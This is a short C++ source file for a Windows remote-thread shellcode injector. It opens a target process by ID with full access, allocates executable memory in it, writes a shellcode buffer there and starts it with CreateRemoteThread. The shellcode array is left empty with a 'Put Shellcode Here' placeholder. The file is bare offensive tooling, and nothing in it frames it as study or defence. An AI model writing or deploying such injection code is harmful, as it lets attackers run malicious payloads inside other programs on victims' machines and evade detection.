#include "includes.h"


int main(int argc, char* argv[])
{
	unsigned char shellcode[] =
		
		//Put Shellcode Here
		
		;


	//Remote Thread Shellcode Injection

	HANDLE hProcess;
	HANDLE rThread;
	PVOID rBuffer;

	printf("[+] Starting Injection to Process with ID: %i\n", atoi(argv[1]));
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), NULL);
	rThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, NULL);
	CloseHandle(hProcess);
	printf("[+] Done\n");
	return 0;
}